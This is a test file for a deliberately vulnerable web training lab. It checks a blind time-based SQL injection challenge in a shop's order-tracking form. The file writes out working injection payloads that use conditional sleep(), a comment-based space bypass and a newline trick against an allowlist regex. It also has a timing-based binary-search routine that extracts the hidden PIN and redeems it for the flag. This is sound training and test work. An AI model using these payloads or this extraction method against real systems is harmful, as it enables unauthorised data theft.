// src/districts/relic-market/rm-03-blind-time-sqli/rm-03.spec.ts
// Timing is read off the FAKE clock (useFakeClock): a request's delay is exact and the test never waits real time.
import { describe, it, expect } from 'vitest';
import type request from 'supertest';
import { describeExploitMatrix, describeLabView, freshSession, DB_ERROR_RE, FLAG_RE, type Agent } from '../../../../tests/helpers.js';
import { LEVELS, type Level } from '../../../core/levels.js';
import { describeCurlExample } from '../../_shared/curl.testkit.js';
import { useFakeClock } from '../_shared/shop-lab.testkit.js';
import { RM03 } from './challenge.js'; // registers RM-03 before createApp() inside freshSession
import { ordersDb, vaultPin } from './model.js';

const LAB = '/d/relic-market/blind-time-sqli';
interface Ctx { readonly agent: Agent; readonly level: Level; readonly sid: string }
type Script = (c: Ctx) => Promise<request.Response>;
const clock = useFakeClock();

const url = (c: Pick<Ctx, 'level'>, sub = '') => `${LAB}${sub}?level=${c.level}`;
const track = (c: Ctx, orderNo: string) => c.agent.post(url(c, '/track')).type('form').send({ order_no: orderNo });
const redeem = (c: Ctx, code: string) => c.agent.post(url(c, '/redeem')).type('form').send({ code });
/** One request and how long the shop took to answer it, on the fake clock (the only thing a blind player can measure). */
async function timed(c: Ctx, orderNo: string): Promise<{ dt: number; res: request.Response }> {
  const t0 = clock.now();
  const res = await track(c, orderNo);
  return { dt: clock.now() - t0, res };
}
const messageOf = (html: string): string => /<p class="lab-message[^>]*>([\s\S]*?)<\/p>/.exec(html)?.[1] ?? '';

const ALPHABET = '0123456789abcdef';
/** Binary search over the sorted hex alphabet (4 timed requests a character), then redeem what was read. */
async function extractAndRedeem(c: Ctx, payload: (index: number, above: string) => string): Promise<request.Response> {
  let pin = '';
  for (let i = 1; i <= 6; i++) {
    let lo = 0;
    let hi = ALPHABET.length - 1;
    while (lo < hi) {
      const mid = (lo + hi) >> 1;
      if ((await timed(c, payload(i, ALPHABET[mid]))).dt >= 1000) lo = mid + 1; else hi = mid;
    }
    pin += ALPHABET[lo];
  }
  return redeem(c, pin);
}
const cond = (i: number, above: string) => `substr((SELECT pin FROM vault),${i},1)>'${above}'`;
const sleepIf = (i: number, above: string) => `sleep(CASE WHEN ${cond(i, above)} THEN 2 ELSE 0 END)`;

// Acolyte: concatenated. A UNION runs sleep() exactly once, whatever the table holds.
const acolyteExploit: Script = (c) => extractAndRedeem(c, (i, ch) => `x' UNION SELECT ${sleepIf(i, ch)}-- `);
// Templar: a space is refused; a block comment separates SQL words just as well.
const templarExploit: Script = (c) => extractAndRedeem(c, (i, ch) => `x'/**/UNION/**/SELECT/**/${sleepIf(i, ch).replace(/ /g, '/**/')}--`);
// Inquisitor: the multiline flag makes ^ and $ match at LINE boundaries, so a valid first line carries the rest.
const inquisitorExploit: Script = (c) => extractAndRedeem(c, (i, ch) => `RM-1001\n' UNION SELECT ${sleepIf(i, ch)}-- `);

describeExploitMatrix<Script>({
  challenge: RM03,
  path: LAB,
  send: (agent, level, script, _url, { sid }) => script({ agent, level, sid }),
  exploits: { acolyte: acolyteExploit, templar: templarExploit, inquisitor: inquisitorExploit },
  resisted: 'Invalid vault PIN.',
  legit: [{
    name: 'track order RM-1001', input: (c) => track(c, 'RM-1001'),
    expect: 'If order RM-1001 exists, its status has been emailed to the address on file.',
  }],
  // A blind lab shows no database text at ANY level (decision Q4): see "no database text at any level" below.
  malformed: [],
  privileged: { name: 'the real vault PIN at Divine', input: (c) => redeem(c, vaultPin('divine')), expect: 'Vault PIN accepted.' },
});

describeLabView({
  challenge: RM03,
  path: LAB,
  account: /Your last order: <code>RM-1001<\/code>/,
  echoField: 'order_no',
  extra: { intent: 'track' },
  oddBodies: [
    { intent: 'track', order_no: { a: 1 } }, { intent: ['track'], order_no: ['RM-1001'] }, { intent: 'redeem', code: { $ne: 1 } },
    { intent: 'track', order_no: [{ a: 1 }] }, [], { intent: { constructor: 1 }, order_no: 'RM-1001' },
  ],
  ok: (agent, level) => agent.post(`${LAB}?level=${level}`).type('form').send({ intent: 'track', order_no: 'RM-1001' }),
  bad: (agent, level) => agent.post(`${LAB}?level=${level}`).type('form').send({ intent: 'redeem', code: 'zzzzzz' }),
});

describeCurlExample({ challenge: RM03, path: LAB, curl: () => ({ path: '/track', form: ['order_no=RM-1001'] }) });

describe('RM-03 blind time-based SQLi', () => {
  it('every level has its own random 6-hex vault PIN, stable per level, and the orders are RM-1001 to RM-1005', () => {
    const pins = LEVELS.map((l) => vaultPin(l));
    for (const p of pins) expect(p).toMatch(/^[0-9a-f]{6}$/);
    expect(new Set(pins).size).toBe(LEVELS.length);
    expect(vaultPin('templar')).toBe(vaultPin('templar'));
    for (const l of LEVELS) {
      expect(ordersDb(l).prepare('SELECT order_no FROM orders ORDER BY order_no').all().map((r) => r.order_no))
        .toEqual(['RM-1001', 'RM-1002', 'RM-1003', 'RM-1004', 'RM-1005']);
      expect(ordersDb(l).prepare('SELECT pin FROM vault').all()).toEqual([{ pin: vaultPin(l) }]);
    }
  });

  it('a true condition costs 2000 ms and a false one 0, at acolyte, templar and inquisitor', async () => {
    const { agent, sid } = await freshSession();
    const payloads: Record<'acolyte' | 'templar' | 'inquisitor', (i: number, ch: string) => string> = {
      acolyte: (i, ch) => `x' UNION SELECT ${sleepIf(i, ch)}-- `,
      templar: (i, ch) => `x'/**/UNION/**/SELECT/**/${sleepIf(i, ch).replace(/ /g, '/**/')}--`,
      inquisitor: (i, ch) => `RM-1001\n' UNION SELECT ${sleepIf(i, ch)}-- `,
    };
    for (const level of ['acolyte', 'templar', 'inquisitor'] as const) {
      const c: Ctx = { agent, level, sid };
      expect((await timed(c, payloads[level](1, '/'))).dt, `${level} true`).toBe(2000); // every hex digit is above '/'
      expect((await timed(c, payloads[level](1, 'g'))).dt, `${level} false`).toBe(0); // and none above 'g'
    }
  });

  it('divine never delays: the same payloads are refused before any SQL runs, and nothing sleeps', async () => {
    const { agent, sid } = await freshSession();
    const c: Ctx = { agent, level: 'divine', sid };
    for (const p of [
      `x' UNION SELECT ${sleepIf(1, '/')}-- `, `x'/**/UNION/**/SELECT/**/sleep(2)--`, `RM-1001\n' UNION SELECT ${sleepIf(1, '/')}-- `,
      "RM-1001' UNION SELECT sleep(2)-- ", 'RM-1001', 'RM-9999', '',
    ]) {
      const { dt, res } = await timed(c, p);
      expect(dt, JSON.stringify(p)).toBe(0);
      expect(res.status).toBe(200);
    }
    expect(messageOf((await track(c, 'RM-1001\n')).text)).toBe('Invalid order number.'); // a trailing newline is no match
    expect(messageOf((await track(c, 'RM-1001\nRM-1002')).text)).toBe('Invalid order number.');
    expect(messageOf((await track(c, 'rm-1001')).text)).toBe('Invalid order number.');
    expect(messageOf((await track(c, 'RM-12345')).text)).toBe('Invalid order number.');
  });

  it('the delay is capped at 5000 ms per request, and sleep() takes only plain numbers of seconds', async () => {
    const { agent, sid } = await freshSession();
    const c: Ctx = { agent, level: 'acolyte', sid };
    const delayOf = async (expr: string) => (await timed(c, `x' UNION SELECT ${expr}-- `)).dt;
    expect(await delayOf('sleep(60)')).toBe(5000);
    expect(await delayOf('sleep(5)+sleep(5)+sleep(5)')).toBe(5000);
    expect(await delayOf('sleep(1e400)')).toBe(5000);
    expect(await delayOf('sleep(0.5)')).toBe(500);
    expect(await delayOf('sleep(2)+sleep(1)')).toBe(3000);
    expect(await delayOf('sleep(-5)+sleep(2)'), 'a negative never cancels a delay').toBe(2000);
    expect(await delayOf('sleep(2)+sleep(-5)'), 'a negative never cancels a delay').toBe(2000);
    for (const bad of ['sleep(-5)', "sleep('abc')", 'sleep(NULL)', "sleep(x'02')", "sleep('')"]) expect(await delayOf(bad), bad).toBe(0);
    expect(await delayOf("sleep('2')"), 'text that is a number').toBe(2000);
  });

  it('a query that sleeps and then fails leaves nothing behind: the next request starts from 0', async () => {
    const { agent, sid } = await freshSession();
    const c: Ctx = { agent, level: 'acolyte', sid };
    const failing = await timed(c, "x' UNION SELECT json(CASE WHEN sleep(3)=0 THEN '{' ELSE '{' END)-- ");
    expect(failing.dt).toBe(3000); // the sleep ran before the error, so the failed request still took its time
    expect(failing.res.status).toBe(200);
    expect(failing.res.text).not.toMatch(DB_ERROR_RE);
    expect(messageOf(failing.res.text)).not.toMatch(/malformed/i);
    expect((await timed(c, 'RM-1001')).dt).toBe(0);
    expect((await timed(c, "x' UNION SELECT sleep(1)-- ")).dt).toBe(1000); // not 1000 plus a stale remainder
  });

  it('sleep() never blocks: the whole delay is simulated on the clock, not spent', () => {
    const t0 = performance.now();
    ordersDb('acolyte').prepare('SELECT sleep(5)').get();
    ordersDb('acolyte').prepare('SELECT sleep(5)+sleep(5)').get();
    expect(performance.now() - t0).toBeLessThan(500);
  });

  it('the answer is the same bytes for a hit, a miss and an error (the order number only appears as typed)', async () => {
    const { agent, sid } = await freshSession();
    for (const level of LEVELS) {
      const c: Ctx = { agent, level, sid };
      const normalise = (html: string) => html.replace(/RM-100\d('|&#39;)?/g, 'N');
      const hit = await track(c, 'RM-1001');
      const miss = await track(c, 'RM-1009');
      const err = await track(c, "RM-1001'"); // a syntax error where the level lets it through
      for (const [name, r] of [['hit', hit], ['miss', miss]] as const) {
        expect(r.status, `${level} ${name}`).toBe(200);
        expect(messageOf(r.text), `${level} ${name}`).toMatch(/^If order RM-100\d exists, its status has been emailed to the address on file\.$/);
      }
      expect(normalise(miss.text), level).toBe(normalise(hit.text));
      if (level === 'acolyte' || level === 'templar') {
        expect(normalise(err.text), level).toBe(normalise(hit.text));
        expect(err.text, level).toMatch(/class="lab-message lab-success"/);
      }
      expect(hit.text, level).toMatch(/class="lab-message lab-success"/);
    }
  });

  it('no database text at any level: a broken query is the same uniform answer', async () => {
    const { agent, sid } = await freshSession();
    for (const level of LEVELS) {
      const c: Ctx = { agent, level, sid };
      for (const p of ["'", "RM-1001'", "x' UNION SELECT", 'x\' UNION SELECT nosuch FROM nowhere--', "RM-1001\n'", "RM-1001\n' UNION SELECT json('{')-- ", '\\']) {
        const res = await track(c, p);
        expect(res.status, `${level} ${JSON.stringify(p)}`).toBe(200);
        expect(res.text, level).not.toMatch(DB_ERROR_RE);
        expect(messageOf(res.text), level).not.toMatch(/SQLITE|near "|no such (table|column)|unrecognized|incomplete input|malformed/i);
        expect(res.text, level).not.toMatch(FLAG_RE);
        expect(messageOf(res.text), `${level} ${JSON.stringify(p)}`).toMatch(/^(Invalid order number\.|If order [\s\S]* exists, its status has been emailed to the address on file\.)$/);
      }
    }
  });

  it('templar: only the space character is refused; tabs, newlines and comments separate words', async () => {
    const { agent, sid } = await freshSession();
    const c: Ctx = { agent, level: 'templar', sid };
    expect(messageOf((await track(c, "x' OR 1=1")).text)).toBe('Invalid order number.');
    expect(messageOf((await track(c, ' ')).text)).toBe('Invalid order number.');
    for (const sep of ['/**/', '\t', '\n', '\r', '\f']) {
      expect((await timed(c, `x'${sep}UNION${sep}SELECT${sep}sleep(2)--`)).dt, JSON.stringify(sep)).toBe(2000);
    }
  });

  it('inquisitor: the allowlist is applied per line (flag m), so one valid line is enough; plain junk is refused', async () => {
    const { agent, sid } = await freshSession();
    const c: Ctx = { agent, level: 'inquisitor', sid };
    for (const bad of ['', 'x', 'RM-100', 'RM-10011', "x' UNION SELECT sleep(2)-- ", 'rm-1001', ' RM-1001x']) {
      const { dt, res } = await timed(c, bad);
      expect(messageOf(res.text), JSON.stringify(bad)).toBe('Invalid order number.');
      expect(dt).toBe(0);
    }
    expect((await timed(c, "RM-1001\n' UNION SELECT sleep(2)-- ")).dt).toBe(2000);
    expect((await timed(c, "junk\nRM-1001\n' UNION SELECT sleep(2)-- ")).dt, 'the valid line may be anywhere').toBe(2000);
  });

  it('the page keeps the typed order number escaped, and offers the vault PIN form and a timing curl line', async () => {
    const { agent } = await freshSession();
    const html = (await agent.get(`${LAB}?level=acolyte`)).text;
    expect(html).toContain('Track your order');
    expect(html).toContain('sleep(seconds)');
    expect(html).toContain('Redeem vault PIN (6 characters)');
    expect(html).toContain('curl -o /dev/null -s -w');
    expect(html).toContain('time_total');
    expect(html).not.toMatch(/class="lab-message/);
  });

  it('a vault PIN read at one level redeems nowhere else, only the exact PIN redeems, and there is no limiter', async () => {
    const { agent, sid } = await freshSession();
    const real = vaultPin('acolyte');
    const a: Ctx = { agent, level: 'acolyte', sid };
    for (let i = 0; i < 40; i++) expect(messageOf((await redeem(a, `00000${i % 10}`)).text)).toBe('Invalid vault PIN.');
    expect(messageOf((await redeem(a, real)).text)).toMatch(/^Vault PIN accepted\. Flag: HVWA\{[0-9a-f]{32}\}$/);
    for (const level of ['templar', 'inquisitor', 'divine'] as const) {
      const res = await redeem({ agent, level, sid }, real);
      expect(messageOf(res.text), level).toBe('Invalid vault PIN.');
      expect(res.text, level).not.toMatch(FLAG_RE);
    }
    for (const bad of ['', real.slice(0, 5), `${real}0`, ` ${real}`]) expect(messageOf((await redeem(a, bad)).text), JSON.stringify(bad)).toBe('Invalid vault PIN.');
  });

  it('has no Restart: the lab mutates nothing', async () => {
    const { agent } = await freshSession();
    expect((await agent.post(`${LAB}/_reset?level=acolyte`)).status).toBe(404);
  });
});

describe('RM-03 names its target', () => {
  it('the summary (ID and EN) and the lab page name the vault table and its pin column', async () => {
    const { agent } = await freshSession();
    for (const p of ['/c/RM-03?lang=en', '/c/RM-03?lang=id', `${LAB}?level=acolyte`]) {
      const html = (await agent.get(p)).text;
      expect(html, p).toContain('vault');
      expect(html, p).toMatch(/vault<\/code>[^<]*<code>pin|vault\.pin|<code>pin<\/code>/);
    }
  });
});
